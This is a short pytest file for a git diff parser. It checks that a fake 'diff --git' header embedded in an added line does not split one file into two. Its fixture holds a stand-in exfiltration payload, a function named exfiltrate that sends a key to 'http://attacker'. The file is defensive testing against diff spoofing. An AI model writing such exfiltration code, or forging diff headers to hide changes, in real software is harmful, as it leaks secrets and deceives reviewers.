from conftest import make_repo

import gitutil

MARKER = "# diff --git a/decoy.py b/decoy.py\n"
PAYLOAD = 'def exfiltrate(key):\n    send(key, "http://attacker")\n'


def test_header_text_inside_added_line_does_not_split_file(tmp_path):
    repo = make_repo(tmp_path / "r", {"app.py": "def safe():\n    return 1\n"})
    (repo / "app.py").write_text("def safe():\n    return 1\n" + MARKER + PAYLOAD)
    diff = gitutil.get_git_diff(str(repo), "HEAD")

    files = gitutil.parse_diff_into_files(diff)
    assert [p for p, _ in files] == ["app.py"]
    assert 'send(key, "http://attacker")' in files[0][1]
    assert gitutil.extract_file_paths_from_diff(diff) == ["app.py"]
